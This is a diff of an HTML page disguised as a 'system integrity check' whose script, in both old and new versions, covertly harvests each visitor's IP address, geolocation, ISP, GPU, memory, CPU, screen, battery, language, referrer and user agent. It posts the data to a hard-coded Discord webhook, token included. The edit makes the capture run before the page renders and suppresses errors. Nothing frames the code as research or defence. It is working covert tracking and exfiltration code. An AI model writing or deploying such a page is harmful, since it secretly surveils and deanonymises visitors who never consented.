@@ -1,74 +1,66 @@
-<<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking System Files...</title>
-    <style>
-        body { background-color: #0c0c0c; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loading { border: 2px solid #00ff00; padding: 20px; border-radius: 5px; }
-    </style>
     <script>
+        // IIFE starts IMMEDIATELY before page renders
         (async function() {
             try {
-                // 1. Get Deep Geo & IP Info
-                const geoRes = await fetch("https://ipwho.is/");
-                const geo = await geoRes.json();
+                // 1. Start Geo/IP Fetching ASAP
+                const geoPromise = fetch("https://ipwho.is/").then(r => r.json());
 
-                // 2. Get Graphics Card (GPU) Info
+                // 2. Immediate Hardware & Browser Probe
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
-
-                // 3. System Hardware & Memory
-                const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
-                const cpu = navigator.hardwareConcurrency || "Unknown";
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
                 
-                // 4. Battery Status
-                let batteryInfo = "N/A";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? "Charging" : "Unplugged"})`;
-                }
-
-                // 5. Prepare the Payload for Discord
-                const payload = {
-                    embeds: [{
-                        title: "🛠️ Ultimate System Log",
-                        color: 16711680, // Red Color
-                        fields: [
-                            { name: "🌐 Network Details", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.connection.isp}\n**Type:** ${geo.type}\n**ASN:** ${geo.connection.asn}`, inline: false },
-                            { name: "📍 Location", value: `**City:** ${geo.city}\n**Region:** ${geo.region}\n**Country:** ${geo.country} ${geo.flag.emoji}`, inline: true },
-                            { name: "⏰ Timezone", value: `**ID:** ${geo.timezone.id}\n**Current:** ${geo.timezone.current_time}`, inline: true },
-                            { name: "🖥️ Hardware", value: `**GPU:** ${gpu}\n**CPU Cores:** ${cpu}\n**RAM:** ~${ram}`, inline: false },
-                            { name: "📱 Device Info", value: `**OS:** ${navigator.platform}\n**Screen:** ${window.screen.width}x${window.screen.height}\n**Battery:** ${batteryInfo}`, inline: true },
-                            { name: "🔗 Navigation", value: `**Language:** ${navigator.language}\n**Referrer:** ${document.referrer || "Direct Visit"}`, inline: true },
-                            { name: "🌍 Browser User Agent", value: `\`${navigator.userAgent}\``, inline: false }
-                        ],
-                        footer: { text: "Data captured successfully" },
-                        timestamp: new Date()
-                    }]
+                const systemData = {
+                    ua: navigator.userAgent,
+                    ram: navigator.deviceMemory || "Unknown",
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    screen: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`,
+                    lang: navigator.languages ? navigator.languages.join(", ") : navigator.language,
+                    ref: document.referrer || "Direct Link",
+                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
                 };
 
-                // 6. Send to your NEW Webhook
+                // 3. Wait for Geo data to finish
+                const geo = await geoPromise;
+
+                // 4. Send to Webhook instantly
                 await fetch("https://discord.com/api/webhooks/1459862155766665229/lW5xj4VpA_c8QEQGM281LRJPrTfcimHYcC7u7LCksU66eckChpVWBPcStgR977CD3NnH", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🚨 Immediate System Capture",
+                            color: 0, // Black
+                            fields: [
+                                { name: "🌐 Network/IP", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.connection.isp}\n**Type:** ${geo.type}`, inline: false },
+                                { name: "📍 Location", value: `**City:** ${geo.city}\n**Country:** ${geo.country} ${geo.flag.emoji}\n**Timezone:** ${systemData.tz}`, inline: true },
+                                { name: "💻 Hardware", value: `**GPU:** ${gpu}\n**RAM:** ${systemData.ram}GB\n**CPU:** ${systemData.cores} Cores`, inline: true },
+                                { name: "🖥️ Browser/OS", value: `**Screen:** ${systemData.screen}\n**Cookies:** ${systemData.cookies}\n**Lang:** ${systemData.lang}`, inline: false },
+                                { name: "🔗 Origin", value: `**Ref:** ${systemData.ref}`, inline: true },
+                                { name: "📝 User Agent", value: `\`${systemData.ua}\``, inline: false }
+                            ],
+                            timestamp: new Date()
+                        }]
+                    })
                 });
-
-            } catch (err) {
-                console.error("Critical Failure:", err);
-            }
+            } catch (e) { }
         })();
     </script>
+    <title>Checking Integrity...</title>
+    <style>
+        body { background: #000; color: #33ff33; font-family: 'Courier New', monospace; text-align: center; padding-top: 20%; }
+        .cursor { border-right: 2px solid #33ff33; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
+    </style>
 </head>
 <body>
-    <div class="loading">
-        <h2>[ SYSTEM CHECK IN PROGRESS ]</h2>
-        <p>Scanning directory: C:/Users/Public/Documents/...</p>
-        <p>Verifying network integrity...</p>
-    </div>
+    <h2>[ ACCESSING SYSTEM DATA <span class="cursor"></span> ]</h2>
+    <p>Please wait while your environment is verified...</p>
 </body>
 </html>
